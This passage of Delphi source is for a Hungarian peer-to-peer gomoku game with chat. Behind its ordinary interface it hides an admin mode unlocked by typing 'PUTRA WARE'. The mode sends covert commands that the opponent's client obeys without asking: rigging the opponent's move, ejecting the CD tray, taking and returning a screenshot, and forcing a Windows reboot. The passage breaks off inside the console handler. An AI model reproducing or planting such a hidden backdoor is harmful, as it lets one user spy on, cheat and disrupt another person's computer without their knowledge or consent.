unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ExtCtrls, Menus, ScktComp, ComCtrls, StdCtrls, MMSystem, Jpeg, ShellAPI,
  CliBmp;

type
  TForm1 = class(TForm)
    Image1: TImage;
    MainMenu1: TMainMenu;
    mnuConnect: TMenuItem;
    mnuAbout: TMenuItem;
    ClientSocket1: TClientSocket;
    ServerSocket1: TServerSocket;
    StatusBar1: TStatusBar;
    lstUzenetek: TListBox;
    Label1: TLabel;
    txtUzenet: TEdit;
    cmdKuldes: TButton;
    mnuNewgame: TMenuItem;
    Label2: TLabel;
    cmdEllenIdeLep: TButton;
    cmdCDAjtoKi: TButton;
    cmdCDAjtoKiBe: TButton;
    txtConsole: TEdit;
    Label3: TLabel;
    lstConsole: TListBox;
    cmdScreenshot: TButton;
    imgAdmin: TImage;
    ClientSocket2: TClientSocket;
    ServerSocket2: TServerSocket;
    mnuTournament: TMenuItem;
    cmdReboot: TButton;
    Jtk1: TMenuItem;
    procedure FormPaint(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure mnuConnectClick(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocket1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure Status(s: string);
    procedure mnuAboutClick(Sender: TObject);
    procedure Delay(Seconds, MilliSec: word);
    procedure txtUzenetKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure cmdKuldesClick(Sender: TObject);
    procedure lstUzenetekMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    function CheckIfWin: string;
    procedure mnuNewgameClick(Sender: TObject);
    procedure StartNewGame;
    procedure FormKeyPress(Sender: TObject; var Key: Char);
    procedure cmdEllenIdeLepClick(Sender: TObject);
    procedure cmdCDAjtoKiClick(Sender: TObject);
    procedure cmdCDAjtoKiBeClick(Sender: TObject);
    procedure txtConsoleKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure ClientSocket1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure lstConsoleMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    procedure Console(s: string);
    procedure cmdScreenshotClick(Sender: TObject);
    procedure CreateAndSendScreenshot;
    procedure ServerSocket2ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure mnuTournamentClick(Sender: TObject);
    procedure cmdRebootClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

  TAmobaServer = record
   AcceptedIP: string;
   ClientConnected: boolean;
  end;

var
  Form1: TForm1;
  Map: array[1..20,1..20] of string;
  kep_Gomb, kep_X, kep_O, kep_Friss_O, kep_Friss_X: TBitmap;
  AmobaServer: TAmobaServer = (AcceptedIP: '';ClientConnected :false);
  ItIsYourTurn: boolean = false;
  IAmTheServer: boolean = false;
  Gaming: boolean = false;
  Nyertes: TRect;
  VanNyertes: boolean = false;
  FrissLepes: TPoint;
  Admin_Begepelt: string = '';
  Admin_LepesOda: boolean = false;
  NextStepTo: TPoint = (x:-1;y:-1);
  Buffer: array[0..9999] of char;

const
  ProgramName: string = 'Putra Net�d�l�';

implementation

uses Unit2;

{$R *.DFM}
{$R 'kepek.res'}

procedure TForm1.FormPaint(Sender: TObject);
var i,k: integer;
begin
 for i := 1 to 20 do
  for k := 1 to 20 do
   if Map[i,k] = '-' then
    Image1.Canvas.Draw(i*16-16,k*16-16,kep_Gomb)
   else if Map[i,k] = 'x' then
    Image1.Canvas.Draw(i*16-16,k*16-16,kep_X)
   else if Map[i,k] = 'o' then
   Image1.Canvas.Draw(i*16-16,k*16-16,kep_O);

 if FrissLepes.X <> -1 then
  Image1.Canvas.Draw((FrissLepes.X*16)-16,(FrissLepes.Y*16)-16,kep_Friss_O);
end;

procedure TForm1.FormCreate(Sender: TObject);
var i,k: integer;
begin
 Width := 335;

 for i := 1 to 20 do
  for k := 1 to 20 do
   Map[i,k] := '-';

 FrissLepes := point(-1,-1);

 kep_Gomb := TBitmap.Create;
 kep_X := TBitmap.Create;
 kep_O := TBitmap.Create;
 kep_Friss_O := TBitmap.Create;
 kep_Friss_X := TBitmap.Create;

 kep_Gomb.LoadFromResourceName(HInstance,'GOMB');
 kep_X.LoadFromResourceName(HInstance,'LENYOMOTT_X');
 kep_O.LoadFromResourceName(HInstance,'LENYOMOTT_O');
 kep_Friss_O.LoadFromResourceName(HInstance,'FRISS_O');
 kep_Friss_X.LoadFromResourceName(HInstance,'FRISS_X');

 FormPaint(Sender);

 Caption := ProgramName;
 Console('Program inicializ�l�sa, ' + DateTimeToStr(Now));

 ServerSocket1.Port := 1465;
 ClientSocket1.Port := 1465;
 ServerSocket1.Active := true;

 ServerSocket2.Port := 1466;
 ClientSocket2.Port := 1466;
 ServerSocket2.Active := true;
end;

procedure TForm1.Image1MouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var posX, posY: integer;
    i, SockNo: integer;
    s: string;
begin
 if not Gaming then
 begin
  Status('Nem folyik j�t�k!');
  Abort;
 end;
 if not ItIsYourTurn then
  if not Admin_LepesOda then
  begin
   Status('Nem te j�ssz!');
   Abort;
  end;

 Status('L�p�s feldolgoz�sa...');
// Delay(0,500);

 posX := (X div 16) + 1;
 posY := (Y div 16) + 1;
 if NextStepTo.X <> -1 then
 begin
  posX := NextStepTo.X;
  posY := NextStepTo.Y;
  NextStepTo.X := -1;
  NextStepTo.Y := -1;
 end;
 if Map[posX,posY] <> '-' then
 begin
  Status('Ott m�r van valaki!');
  Abort;
 end;

{-------------------H�L�-KEZDETE-----------}
 Status('L�p�s k�ld�se...');
 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel, val�sz�n�leg megszakadt a kapcsolat.',PChar(ProgramName),mb_Ok + mb_IconStop);
   Abort;
  end;
  if Admin_LepesOda then
   s := 'ADMIN_L'
  else
   s := 'L';
  if Length(IntToStr(posX)) = 1 then s := s + '0';
  s := s + IntToStr(posX);
  if Length(IntToStr(posY)) = 1 then s := s + '0';
  s := s + IntToStr(posY);
  try
   ServerSocket1.Socket.Connections[SockNo].SendText(s);
  except
   Application.MessageBox('Hiba t�rt�nt a l�p�s elk�ld�se k�zben!',PChar(ProgramName),mb_Ok + mb_IconError);
   Abort;
  end;
 end
 else
 begin                            //ha kliens
  if not ClientSocket1.Active then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni a szerverrel!',PChar(ProgramName),mb_Ok + mb_IconError);
   Abort;
  end;
  if Admin_LepesOda then
   s := 'ADMIN_L'
  else
   s := 'L';
  if Length(IntToStr(posX)) = 1 then s := s + '0';
  s := s + IntToStr(posX);
  if Length(IntToStr(posY)) = 1 then s := s + '0';
  s := s + IntToStr(posY);
  ClientSocket1.Socket.SendText(s);
 end;
{-------------------H�L�-V�GE--------------}

 Status('');

 if Admin_LepesOda then
 begin
  Admin_LepesOda := false;
  Abort;
 end;

 Map[posX,posY] := 'x';
 ItIsYourTurn := false;
 FormPaint(Sender);
 if (CheckIfWin <> '')or(VanNyertes) then
 begin
  VanNyertes := true;
  Status('Nyert�l!');
  Image1.Canvas.Pen.Color := clBlack;
  Image1.Canvas.Pen.Style := psSolid;
  Image1.Canvas.Pen.Width := 2;
  Image1.Canvas.MoveTo((Nyertes.Left*16)-8,(Nyertes.Top*16)-8);
  Image1.Canvas.LineTo((Nyertes.Right*16)-8,(Nyertes.Bottom*16)-8);
  Gaming := false;
 end;
end;

procedure TForm1.mnuConnectClick(Sender: TObject);
var temp: string;
    i, SockNo: integer;
begin
 if mnuConnect.Caption = 'Ellenf�l megad�sa' then
 begin
  temp := InputBox('Azonos�t�','K�rem az ellenf�l IP c�m�t:','169.254.196.170');
  if trim(temp) = '' then
   Abort;
  ClientSocket1.Address := temp;
  AmobaServer.AcceptedIP := temp;
  Status('Kapcsolatfelv�tel');
  ClientSocket1.Active := true;
  IAmTheServer := false;
  mnuConnect.Caption := 'Kapcsolat megsz�ntet�se';
  mnuTournament.Visible := false;
  Status('Enged�lyk�r�s');
// Delay(10,0);
  Application.MessageBox('Most az ellenf�l v�lasz�ra kell v�rni, ez eltarthat egy darabig.',PCHar(ProgramName),mb_Ok + mb_IconInformation);
  Console('''QUERYOKAY'' k�ld�se');
  ClientSocket1.Socket.SendText('QUERYOKAY');
 end
 else
 begin
  Status('Lecsatlakoz�s');
  if IAmTheServer then
  begin
   SockNo := -1;
   for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
    if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
     SockNo := i;
   if SockNo <> -1 then
    ServerSocket1.Socket.Connections[SockNo].Close;
  end
  else
   ClientSocket1.Close;
  mnuConnect.Caption := 'Ellenf�l megad�sa';
  mnuTournament.Visible := false;
  IAmTheServer := false;
  Gaming := false;
 end;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
 IAmTheServer := true;
 if not AmobaServer.ClientConnected then
 begin
  AmobaServer.ClientConnected := true;
  AmobaServer.AcceptedIP := Socket.RemoteAddress;
  Status('Ellenf�l csatlakozott');
  Console('IP: ' + Socket.RemoteAddress);
 end
 else
  Status('Csatlakoz�s, de m�r van ellenf�l');

 mnuConnect.Caption := 'Kapcsolat megsz�ntet�se';
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
 if Socket.RemoteAddress = AmobaServer.AcceptedIP then
 begin
  AmobaServer.AcceptedIP := '';
  AmobaServer.ClientConnected := false;
  mnuConnect.Caption := 'Ellenf�l megad�sa';
  mnuTournament.Visible := true;
  IAmTheServer := false;
  Status('Az ellenf�llel megszakadt a kapcsolat.');
  Gaming := false;
 end;
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var posX, posY: integer;
    s: string;
begin
 s := Socket.ReceiveText;
 Console('''' + s + ''' �zenet �rkezett');
 if s = 'QUERYOKAY' then //kapcsolatra enged�lyk�r�s
  if Socket.RemoteAddress = AmobaServer.AcceptedIP then //ha megengedj�k
  begin
   Status('Ellenf�llel val� kommunik�ci�');
   Delay(1,0);
   mnuTournament.Visible := false;
   Socket.SendText('OKAY');
   Console('''OKAY'' k�ld�se');
   Delay(1,0);
   Status('Az ellenf�l bejelentkezett');
   Application.MessageBox('Az ellenf�l bejelentkezett, kezdheted a j�t�kot.',PChar(ProgramName),mb_Ok + mb_IconInformation);
   ItIsYourTurn := true;
   IAmTheServer := true;
   Gaming := true;
  end
  else                                                 //ha nem
  begin
   Status('K�r�s elutas�t�sa');
   Console('''NOTOKAY'' k�ld�se');
   Socket.SendText('NOTOKAY');
  end;
 if s[1] = 'L' then                                   //l�p�s
 begin
  posX := StrToInt(Copy(s,2,2));
  posY := StrToInt(Copy(s,4,2));
  Map[posX,posY] := 'o';
  FrissLepes := point(posX,posY);
  ItIsYourTurn := true;
  FormPaint(Sender);
  Status('Az ellenf�l l�pett, te j�ssz');
  if (CheckIfWin <> '')or(VanNyertes) then
  begin
   VanNyertes := true;
   Status('Az ellenf�l nyert!');
   Image1.Canvas.Pen.Color := clBlack;
   Image1.Canvas.Pen.Style := psSolid;
   Image1.Canvas.Pen.Width := 2;
   Image1.Canvas.MoveTo((Nyertes.Left*16)-8,(Nyertes.Top*16)-8);
   Image1.Canvas.LineTo((Nyertes.Right*16)-8,(Nyertes.Bottom*16)-8);
   Gaming := false;
  end;
 end;
 if s[1] = 'U' then                                   //�zenet j�tt
 begin
  lstUzenetek.Items.Add('Ellen: ' + Copy(s,2,Length(s)));
  Status('�zenet j�tt');
//  lstUzenetek.SetFocus;
  lstUzenetek.ItemIndex := lstUzenetek.Items.Count-1;
 end;
 if s = 'QUERYNEW' then           //�j j�t�k
 begin
  posX := Application.MessageBox('Azz ellenf�l �j j�t�kot szeretne kezdeni.'#13#10#13#10'Beleegyezel?',PChar(ProgramName),mb_YesNo + mb_IconQuestion);
  if posX = id_No then
  begin
   Console('''NEWNO'' k�ld�se');
   Socket.SendText('NEWNO')       //nem OK
  end
  else
  begin
   Console('''NEWYES'' k�ld�se');
   Socket.SendText('NEWYES');     //OK
   StartNewGame;
   ItIsYourTurn := true;
   Gaming := true;
   Status('Te kezdesz');
  end;
 end;
 if s = 'NEWNO' then
  Application.MessageBox('Az ellenf�l visszautas�totta az �j j�t�kot.',PChar(ProgramName),mb_Ok + mb_IconInformation);
 if s = 'NEWYES' then
 begin
  StartNewGame;
  Application.MessageBox('Az ellenf�l elfogadta az �j j�t�kot. � kezd.',PChar(ProgramName),mb_Ok + mb_IconInformation);
  if Pos(',te j�ssz',StatusBar1.Panels[0].Text) < 0 then
   ItIsYourTurn := false;
  Gaming := true;
  Status('Az ellenf�l kezd.');
 end;
 if Pos('ADMIN_L',s) = 1 then
 begin
  Console('!!''ADMIN_L'' �rkezett!!');
  NextStepTo.X := StrToInt(Copy(s,8,2));
  NextStepTo.Y := StrToInt(Copy(s,10,2));
 end;
 if s = 'ADMIN_CDDOOR_OPEN' then
 begin
  Console('!!''ADMIN_CDDOOR_OPEN'' �rkezett!!');
  mciSendString('set cdaudio door open',nil,0,0);
 end;
 if s = 'ADMIN_CDDOOR_OPENCLOSE' then
 begin
  Console('!!''AMIN_CDDOOR_OPENCLOSE'' �rkezett!');
  mciSendString('set cdaudio door open wait',nil,0,0);
  mciSendString('set cdaudio door closed',nil,0,0);
 end;
 if s = 'ADMIN_SCRNSHOT' then
 begin
  Console('!!''ADMIN_SCRNSHOT'' �rkezett!');
  CreateAndSendScreenshot;
 end;
 if s = 'ADMIN_REBOOT' then
 begin
  Console('!!''ADMIN_REBOOT'' �rkezett!');
  if Form1.Width = 433 then
   Application.MessageBox('''ADMIN_REBOOT'' �rkezett, letiltva.',PChar(ProgramName),mb_Ok + mb_IconInformation)
  else
   ExitWindowsEx(ewx_Reboot + ewx_Force,0);
 end;
end;

procedure TForm1.ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
var posX, posY: integer;
    s: string;
begin
 s := Socket.ReceiveText;
 Console('''' + s + ''' �rkezett');
 if s = 'NOTOKAY' then //kapcsolat elutas�tva
 begin
  Application.MessageBox('Az ellenf�l visszautas�totta a kapcsolatot.',PChar(ProgramName),mb_Ok + mb_IconStop);
  Status('Kapcsolat lez�r�sa');
  ClientSocket1.Close;
  IAmTheServer := false;
  Gaming := false;
  mnuConnect.Caption := 'Ellenf�l megad�sa';
  mnuTournament.Visible := true;
 end;
 if s = 'OKAY' then //kapcsolat enged�lyezve
 begin
  Application.MessageBox('Az ellenf�l elfogadta a kapcsolatot, � kezd.',PChar(ProgramName),mb_Ok + mb_IconInformation);
  ItIsYourTurn := false;
  IAmTheServer := false;
  mnuTournament.Visible := false;
  Gaming := true;
 end;
 if s[1] = 'L' then //l�p�s
 begin
  Status('Az ellen l�p�s�nek feldolgoz�sa');
  posX := StrToInt(Copy(s,2,2));
  posY := StrToInt(Copy(s,4,2));
  Map[posX,posY] := 'o';
  FrissLepes := point(posX,posY);
  ItIsYourTurn := true;
  FormPaint(Sender);
  Status('Az ellenf�l l�pett, te j�ssz');
  if (CheckIfWin <> '')or(VanNyertes) then
  begin
   VanNyertes := true;
   Status('Az ellenf�l nyert!');
   Image1.Canvas.Pen.Color := clBlack;
   Image1.Canvas.Pen.Style := psSolid;
   Image1.Canvas.Pen.Width := 2;
   Image1.Canvas.MoveTo((Nyertes.Left*16)-8,(Nyertes.Top*16)-8);
   Image1.Canvas.LineTo((Nyertes.Right*16)-8,(Nyertes.Bottom*16)-8);
   Gaming := false;
  end;
 end;
 if s[1] = 'U' then //�zenet j�tt
 begin
  lstUzenetek.Items.Add('Ellen: ' + Copy(s,2,Length(s)));
  Status('�zenet j�tt');
//   lstUzenetek.SetFocus;
  lstUzenetek.ItemIndex := lstUzenetek.Items.Count-1;
 end;
 if s = 'QUERYNEW' then           //�j j�t�k
 begin
  posX := Application.MessageBox('Azz ellenf�l �j j�t�kot szeretne kezdeni.'#13#10#13#10'Beleegyezel?',PChar(ProgramName),mb_YesNo + mb_IconQuestion);
  if posX = id_No then
  begin
   Console('''NEWNO'' k�ld�se');
   Socket.SendText('NEWNO')      //nem OK
  end
  else
  begin
   Console('''NEWYES'' k�ld�se');
   Socket.SendText('NEWYES');    //OK
   StartNewGame;
   ItIsYourTurn := true;
   Gaming := true;
   Status('Te kezdesz');
  end;
 end;
 if s = 'NEWNO' then
  Application.MessageBox('Az ellenf�l visszautas�totta az �j j�t�kot.',PChar(ProgramName),mb_Ok + mb_IconInformation);
 if s = 'NEWYES' then
 begin
  StartNewGame;
  Application.MessageBox('Az ellenf�l elfogadta az �j j�t�kot. � kezd.',PChar(ProgramName),mb_Ok + mb_IconInformation);
  if Pos(',te j�ssz',StatusBar1.Panels[0].Text) < 0 then
   ItIsYourTurn := false;
  Gaming := true;
  Status('Az ellenf�l kezd.');
 end;
 if Pos('ADMIN_L',s) = 1 then
 begin
  Console('!!''ADIM_L'' �rkezett!!');
  NextStepTo.X := StrToInt(Copy(s,8,2));
  NextStepTo.Y := StrToInt(Copy(s,10,2));
 end;
 if s = 'ADMIN_CDDOOR_OPEN' then
 begin
  Console('!!''ADMIN_CDDOOR_OPEN'' �rkezett!!');
  mciSendString('set cdaudio door open',nil,0,0);
 end;
 if s = 'ADMIN_CDDOOR_OPENCLOSE' then
 begin
  Console('!!''ADMIN_CDDOOR_OPENCLOSE'' �rkezett!!');
  mciSendString('set cdaudio door open wait',nil,0,0);
  mciSendString('set cdaudio door closed',nil,0,0);
 end;
 if s = 'ADMIN_SCRNSHOT' then
 begin
  Console('!!''ADMIN_SCRNSHOT'' �rkezett!');
  CreateAndSendScreenshot;
 end;
 if s = 'ADMIN_REBOOT' then
 begin
  Console('!!''ADMIN_REBOOT'' �rkezett!');
  if Form1.Width = 433 then
   Application.MessageBox('''ADMIN_REBOOT'' �rkezett, letiltva.',PChar(ProgramName),mb_Ok + mb_IconInformation)
  else
   ExitWindowsEx(ewx_Reboot + ewx_Force,0);
 end;
end;

procedure TForm1.Status(s: string);
begin
 StatusBar1.Panels[0].Text := s;
 Console(s);
end;

procedure TForm1.mnuAboutClick(Sender: TObject);
var s: string;
begin
 s := ProgramName + #13#10#13#10;
 s := s + 'Programmed by: Putra Ware'#13#10;
 s := s + 'http://putraware.ini.hu'#13#10;
 s := s + 'televonzsinor@yahoo.com';
 Application.MessageBox(PChar(s),'N�vjegy',mb_Ok + mb_IconInformation);
end;

procedure TForm1.Delay(Seconds, MilliSec: word);
var TimeOut: TDateTime;
begin
 TimeOut := Now + EncodeTime(0,Seconds div 60,Seconds mod 60,MilliSec);
 while Now < TimeOut do
  Application.ProcessMessages;
end;

procedure TForm1.txtUzenetKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
begin
 if Key = 13 then
 begin
  Key := 0;
  cmdKuldesClick(Sender);
 end;
end;

procedure TForm1.cmdKuldesClick(Sender: TObject);
var i, SockNo: integer;
    s: string;
begin
 if trim(txtUzenet.Text) = '' then
  Abort;

 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni a szerverrel!',PChar(ProgramName),mb_Ok + mb_IconExclamation);
   Abort;
  end;
  s := 'U' + txtUzenet.Text;
  Console('''' + s + ''' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText(s);
 end
 else
 begin
  s := 'U' + txtUzenet.Text;
  Console('''' + s + ''' k�ld�se');
  ClientSocket1.Socket.SendText(s);
 end;
 lstUzenetek.Items.Add('Te: ' + txtUzenet.Text);
// txtUzenet.SelectAll;
 txtUzenet.Clear;
 txtUzenet.SetFocus;
 lstUzenetek.ItemIndex := lstUzenetek.Items.Count-1;
end;

procedure TForm1.lstUzenetekMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var lXPoint, lYPoint, lIndex: longint;
begin
 lXPoint := X;
 lYPoint := Y;

 lIndex := SendMessageA(lstUzenetek.Handle,lb_ItemFromPoint,0,(lYPoint * 65536)+lXPoint);
 if (lIndex >= 0) and (lIndex < lstUzenetek.Items.Count) then
  lstUzenetek.Hint := lstUzenetek.Items[lIndex]
 else
 begin
  lstUzenetek.Hint := '';
  Application.HideHint;
 end;
end;

function TForm1.CheckIfWin: string;
var Egybe: integer;
    i, k: integer;
begin
 Result := '';
 Egybe := 0;
 for i := 1 to 20 do
  for k := 1 to 20 do
   if Map[i,k] = 'x' then
   begin
    Inc(Egybe);
    if Egybe = 5 then
    begin
     Result := 'x';
     Nyertes.Left := i;
     Nyertes.Top := k - 4;
     Nyertes.Bottom := k;
     Nyertes.Right := i;
    end;
   end
   else
    Egybe := 0;
//f�gg�leges, o-ra
 Egybe := 0;
 for i := 1 to 20 do
  for k := 1 to 20 do
   if Map[i,k] = 'o' then
   begin
    Inc(Egybe);
    if Egybe = 5 then
    begin
     Result := 'o';
     Nyertes.Left := i;
     Nyertes.Top := k - 4;
     Nyertes.Bottom := k;
     Nyertes.Right := i;
    end;
   end
   else
    Egybe := 0;
//v�zszintes, x-re
 Egybe := 0;
 for i := 1 to 20 do
  for k := 1 to 20 do
   if Map[k,i] = 'x' then
   begin
    Inc(Egybe);
    if Egybe = 5 then
    begin
     Result := 'x';
     Nyertes.Left := k - 4;
     Nyertes.Top := i;
     Nyertes.Bottom := i;
     Nyertes.Right := k;
    end;
   end
   else
    Egybe := 0;
//v�zszintes, o-ra
 Egybe := 0;
 for i := 1 to 20 do
  for k := 1 to 20 do
   if Map[k,i] = 'o' then
   begin
    Inc(Egybe);
    if Egybe = 5 then
    begin
     Result := 'o';
     Nyertes.Left := k - 4;
     Nyertes.Top := i;
     Nyertes.Bottom := i;
     Nyertes.Right := k;
    end;
   end
   else
    Egybe := 0;
//balfentr�l jobbrale �tl�, x-re
 for i := 1 to 16 do
  for k := 1 to 16 do
   if Map[i,k] = 'x' then
    if Map[i+1,k+1] = 'x' then
     if Map[i+2,k+2] = 'x' then
      if Map[i+3,k+3] = 'x' then
       if Map[i+4,k+4] = 'x' then
       begin
        Result := 'x';
        Nyertes.Left := i;
        Nyertes.Top := k;
        Nyertes.Bottom := k + 4;
        Nyertes.Right := i + 4;
       end;
//balfentr�l jobbrale �tl�, o-ra
 for i := 1 to 16 do
  for k := 1 to 16 do
   if Map[i,k] = 'o' then
    if Map[i+1,k+1] = 'o' then
     if Map[i+2,k+2] = 'o' then
      if Map[i+3,k+3] = 'o' then
       if Map[i+4,k+4] = 'o' then
       begin
        Result := 'o';
        Nyertes.Left := i;
        Nyertes.Top := k;
        Nyertes.Bottom := k + 4;
        Nyertes.Right := i + 4;
       end;
//ballentr�l jobbrafel �tl�, x-re
 for i := 1 to 20 do
  for k := 20 downto 1 do
   if Map[i,k] = 'x' then
    if Map[i-1,k+1] = 'x' then
     if Map[i-2,k+2] = 'x' then
      if Map[i-3,k+3] = 'x' then
       if Map[i-4,k+4] = 'x' then
       begin
        Result := 'x';
        Nyertes.Left := i;
        Nyertes.Top := k;
        Nyertes.Bottom := k + 4;
        Nyertes.Right := i - 4;
       end;
//ballentr�l jobbfentre �tl�, o-ra
 for i := 1 to 20 do
  for k := 20 downto 1 do
   if Map[i,k] = 'o' then
    if Map[i-1,k+1] = 'o' then
     if Map[i-2,k+2] = 'o' then
      if Map[i-3,k+3] = 'o' then
       if Map[i-4,k+4] = 'o' then
       begin
        Result := 'o';
        Nyertes.Left := i;
        Nyertes.Top := k;
        Nyertes.Bottom := k + 4;
        Nyertes.Right := i - 4;
       end;
end;

procedure TForm1.mnuNewgameClick(Sender: TObject);
var i, SockNo: integer;
begin
 if Application.MessageBox('T�nyleg �j j�t�kot akarsz kezdeni?','NetAm�ba',mb_YesNo + mb_IconQuestion) = id_No then
  Abort;

 if mnuConnect.Caption = 'Ellenf�l megad�sa' then
 begin
  StartNewGame;
  Abort;
 end;

 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.','NetAm�ba',mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Status('Ellenf�l megk�rdez�se');
  Console('''QUERYNEW'' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText('QUERYNEW');
 end
 else
 begin
  if not ClientSocket1.Active then
  begin
   Application.MessageBox('Az ellenf�llel nem siker�lt felvenni a kapcsolatot.','NetAm�ba',mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Status('Ellenf�l megk�rdez�se');
  Console('''QUERYNEW'' k�ld�se');
  ClientSocket1.Socket.SendText('QUERYNEW');
 end;
end;

procedure TForm1.StartNewGame;
var i, k: integer;
begin
 for i := 1 to 20 do
  for k := 1 to 20 do
   Map[i,k] := '-';

 FrissLepes := point(-1,-1);
 Console('�j j�t�k ind�t�sa');

 VanNyertes := false;

 FormPaint(Application);
end;

procedure TForm1.FormKeyPress(Sender: TObject; var Key: Char);
var i: integer;
begin
 //(de)aktiv�l�s a 'PUTRA WARE' beg�pal�s�re
 if (Key = 'P')and(Admin_Begepelt = '') then
  Admin_Begepelt := 'P'
 else
 if (Key = 'U')and(Admin_Begepelt = 'P') then
  Admin_Begepelt := 'PU'
 else
 if (Key = 'T')and(Admin_Begepelt = 'PU') then
  Admin_Begepelt := 'PUT'
 else
 if (Key = 'R')and((Admin_Begepelt = 'PUT')or(Admin_Begepelt = 'PUTRA WA')) then
  Admin_Begepelt := Admin_Begepelt + 'R'
 else
 if (Key = 'A')and((Admin_Begepelt = 'PUTR')or(Admin_Begepelt = 'PUTRA W')) then
  Admin_Begepelt := Admin_Begepelt + 'A'
 else
 if (Key = ' ')and(Admin_Begepelt = 'PUTRA') then
  Admin_Begepelt := 'PUTRA '
 else
 if (Key = 'W')and(Admin_Begepelt = 'PUTRA ') then
  Admin_Begepelt := 'PUTRA W'
 else
 if (Key = 'E')and(Admin_Begepelt = 'PUTRA WAR') then

{ if (Key = 'p')and(Admin_Begepelt = '') then
  Admin_Begepelt := 'p'
 else
 if (Key = 'w')and(Admin_Begepelt = 'p') then}
 begin
  Admin_Begepelt := '';
  if Form1.Width = 335 then
  begin
   for i := 335 to 445 do
    Form1.Width := i;
   Console('Admin m�d enged�lyezve');
  end
  else
  begin
   for i := 445 downto 335 do
    Form1.Width := i;
   Console('Admin m�d tiltva');
  end;
 end;
end;

procedure TForm1.cmdEllenIdeLepClick(Sender: TObject);
begin
 Admin_LepesOda := true;
 Status('Kattints oda');
end;

procedure TForm1.cmdCDAjtoKiClick(Sender: TObject);
var i, SockNo: integer;
begin
 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
  if SockNo = -1 then
  begin
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.',PChar(ProgramName),mb_Ok + mb_IconExclamation);
   Abort;
  end;
  Console('''ADMIN_CDDOOR_OPEN'' k�ld�se');
  ServerSocket1.Socket.Connections[SockNo].SendText('ADMIN_CDDOOR_OPEN');
 end
 else
  if ClientSocket1.Active then
  begin
   Console('''ADMIN_CDDOOR_OPEN'' k�ld�se');
   ClientSocket1.Socket.SendText('ADMIN_CDDOOR_OPEN');
  end
  else
   Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.',PChar(ProgramName),mb_Ok + mb_IconExclamation);
end;

procedure TForm1.cmdCDAjtoKiBeClick(Sender: TObject);
var i, SockNo: integer;
begin
  if IAmTheServer then
  begin
   SockNo := -1;
   for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
    if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
     SockNo := i;
   if SockNo = -1 then
   begin
    Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.',PCHar(ProgramName),mb_Ok + mb_IconExclamation);
    Abort;
   end;
   Console('''ADMIN_CDDOOR_OPENCLOSE'' k�ld�se');
   ServerSocket1.Socket.Connections[SockNo].SendText('ADMIN_CDDOOR_OPENCLOSE');
  end
  else
   if ClientSocket1.Active then
   begin
   Console('''ADMIN_CDDOOR_OPENCLOSE'' k�ld�se');
    ClientSocket1.Socket.SendText('ADMIN_CDDOOR_OPENCLOSE');
   end
   else
    Application.MessageBox('Nem siker�lt kommunik�lni az ellenf�llel.',PCHar(ProgramName),mb_Ok + mb_IconExclamation);
end;

procedure TForm1.txtConsoleKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
var i, SockNo: integer;
begin
 if Key <> 13 then
  Abort;

 if IAmTheServer then
 begin
  SockNo := -1;
  for i := 0 to ServerSocket1.Socket.ActiveConnections - 1 do
   if ServerSocket1.Socket.Connections[i].RemoteAddress = AmobaServer.AcceptedIP then
    SockNo := i;
